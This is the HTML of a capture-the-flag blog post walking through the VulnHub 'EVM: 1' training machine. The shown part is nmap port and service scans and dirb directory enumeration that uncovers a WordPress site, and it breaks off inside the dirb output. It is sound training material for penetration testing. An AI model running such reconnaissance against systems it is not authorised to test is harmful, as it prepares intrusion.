@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="nameName: EVM: 1Date release: 2 Nov 2019 downloadDownload: https:&#x2F;&#x2F;mega.nz&#x2F;#F!pVV1CKYI!ABCpQ0qUdbuYIszf0ljH1wDownload (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;evm&#x2F;EVM.ovaDownload (Torrent): https:&#x2F;&#x2F;down">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub-walkthrough[EVM-1]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/05/23/evm/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="nameName: EVM: 1Date release: 2 Nov 2019 downloadDownload: https:&#x2F;&#x2F;mega.nz&#x2F;#F!pVV1CKYI!ABCpQ0qUdbuYIszf0ljH1wDownload (Mirror): https:&#x2F;&#x2F;download.vulnhub.com&#x2F;evm&#x2F;EVM.ovaDownload (Torrent): https:&#x2F;&#x2F;down">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub278.jpg">
+<meta property="article:published_time" content="2020-05-23T06:11:11.000Z">
+<meta property="article:modified_time" content="2020-08-16T16:38:47.224Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="vulnhub靶机练习">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub278.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/05/23/evm/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/05/23/evm/","path":"2020/05/23/evm/","title":"vulnhub-walkthrough[EVM-1]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>vulnhub-walkthrough[EVM-1] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#name"><span class="nav-number">1.</span> <span class="nav-text">name</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#download"><span class="nav-number">2.</span> <span class="nav-text">download</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#description"><span class="nav-number">3.</span> <span class="nav-text">description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#information-gathering"><span class="nav-number">4.</span> <span class="nav-text">information gathering</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-a-shell-by-using-msf"><span class="nav-number">5.</span> <span class="nav-text">get a shell by using msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#privilege-escalation"><span class="nav-number">6.</span> <span class="nav-text">privilege escalation</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Summary-of-knowledge"><span class="nav-number">6.1.</span> <span class="nav-text">Summary of knowledge</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Contact-me"><span class="nav-number">6.2.</span> <span class="nav-text">Contact me</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/05/23/evm/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="vulnhub-walkthrough[EVM-1] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnhub-walkthrough[EVM-1]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-05-23 14:11:11" itemprop="dateCreated datePublished" datetime="2020-05-23T14:11:11+08:00">2020-05-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2020-08-17 00:38:47" itemprop="dateModified" datetime="2020-08-17T00:38:47+08:00">2020-08-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/vulnhub-walkthrough/" itemprop="url" rel="index"><span itemprop="name">vulnhub walkthrough</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><p>Name: EVM: 1<br>Date release: 2 Nov 2019</p>
+<h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>Download: <span class="exturl" data-url="aHR0cHM6Ly9tZWdhLm56LyNGIXBWVjFDS1lJIUFCQ3BRMHFVZGJ1WUlzemYwbGpIMXc=">https://mega.nz/#F!pVV1CKYI!ABCpQ0qUdbuYIszf0ljH1w<i class="fa fa-external-link-alt"></i></span><br>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ldm0vRVZNLm92YQ==">https://download.vulnhub.com/evm/EVM.ova<i class="fa fa-external-link-alt"></i></span><br>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9ldm0vRVZNLm92YS50b3JyZW50">https://download.vulnhub.com/evm/EVM.ova.torrent<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>This is super friendly box intended for Beginner’s</p>
+<p>This may work better with VirtualBox than VMware</p>
+<span id="more"></span>
+
+<h3 id="information-gathering"><a href="#information-gathering" class="headerlink" title="information gathering"></a>information gathering</h3><p>first use nmap as usual</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.*</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.103</span><br><span class="line">Host is up (0.00026s latency).</span><br><span class="line">MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -sC -T4 -p- -v -A 192.168.56.103</span></span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a2:d3:34:13:62:b1:18:a3:<span class="built_in">dd</span>:db:35:c5:5a:b7:c0:78 (RSA)</span><br><span class="line">|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)</span><br><span class="line">|_  256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)</span><br><span class="line">53/tcp  open  domain      ISC BIND 9.10.3-P4 (Ubuntu Linux)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: 9.10.3-P4-Ubuntu</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: PIPELINING TOP RESP-CODES CAPA UIDL SASL AUTH-RESP-CODE</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">|_imap-capabilities: ID OK LITERAL+ IDLE LOGIN-REFERRALS SASL-IR more ENABLE have listed post-login capabilities Pre-login IMAP4rev1 LOGINDISABLEDA0001</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:90:6F:5B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.003 days (since Sat May 23 02:15:27 2020)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=259 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h19m58s, deviation: 2h18m33s, median: -1s</span><br><span class="line">| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;03&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   UBUNTU-EXTERMEL&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="line">|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine</span><br><span class="line">|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine</span><br><span class="line">|_  System time: 2020-05-23T02:20:13-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   <span class="built_in">date</span>: 2020-05-23T06:20:13</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Enumeration</li>
+</ul>
+<p>use dirb</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># dirb http://192.168.56.103/</span></span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Mon May 25 06:24:07 2020</span><br><span class="line">URL_BASE: http://192.168.56.103/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.56.103/ ----</span><br><span class="line">+ http://192.168.56.103/index.html (CODE:200|SIZE:10821)                                            </span><br><span class="line">+ http://192.168.56.103/info.php (CODE:200|SIZE:83014)                                              </span><br><span class="line">+ http://192.168.56.103/server-status (CODE:403|SIZE:302)                                           </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/                                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/index.php (CODE:301|SIZE:0)                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/                                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/                                          </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-includes/                                         </span><br><span class="line">+ http://192.168.56.103/wordpress/xmlrpc.php (CODE:405|SIZE:42)                                     </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/css/                                        </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/images/                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/includes/                                   </span><br><span class="line">+ http://192.168.56.103/wordpress/wp-admin/index.php (CODE:302|SIZE:0)                              </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/js/                                         </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/maint/                                      </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/network/                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-admin/user/                                       </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-content/ ----</span><br><span class="line">+ http://192.168.56.103/wordpress/wp-content/index.php (CODE:200|SIZE:0)                            </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/plugins/                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/themes/                                   </span><br><span class="line">==&gt; DIRECTORY: http://192.168.56.103/wordpress/wp-content/uploads/                                  </span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/css/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/js/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/maint/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode <span class="string">&#x27;-w&#x27;</span> <span class="keyword">if</span> you want to scan it anyway)</span><br><span class="line">                                                                                                    </span><br><span class="line">---- Entering directory: http://192.168.56.103/wordpress/wp-admin/network/ ----</span><br><span class="line">+ 